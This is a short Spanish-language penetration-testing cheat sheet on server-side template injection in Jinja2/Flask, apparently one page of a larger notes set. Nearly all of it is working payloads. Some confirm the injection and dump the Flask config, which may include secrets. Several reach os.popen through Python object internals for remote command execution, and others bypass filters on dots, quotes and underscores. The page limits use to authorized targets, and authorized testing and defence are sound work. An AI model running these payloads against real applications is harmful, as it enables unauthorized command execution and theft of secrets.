# SSTI — Jinja2 / Flask (Python)

Ver índice: [ssti.md](ssti.md). **Solo sobre objetivos autorizados.**

## Confirmar

```
{{7*7}}      -> 49
{{7*'7'}}    -> 7777777   (distingue Jinja2 de otros)
{{config}}   -> vuelca la config de Flask (a veces con secretos)
```

## Camino a RCE (acceso a objetos Python)

La idea: desde un objeto llegar a `__globals__`/`os` y ejecutar. Ejemplos:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   # localizar una clase útil (Popen)
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Bypass de filtros

```
# atributos por corchetes si "." está filtrado
{{ ''['__class__'] }}
# construir cadenas con request.args para evitar comillas
{{ ()['__cl'+'ass__'] }}
# filtrar "_" -> usar |attr() y request
{{ ()|attr('__class__') }}
```

## Notas

- `{{config}}` y `{{self}}` son buenos primeros pasos.
- Demuestra RCE con `id`; no toques nada más.
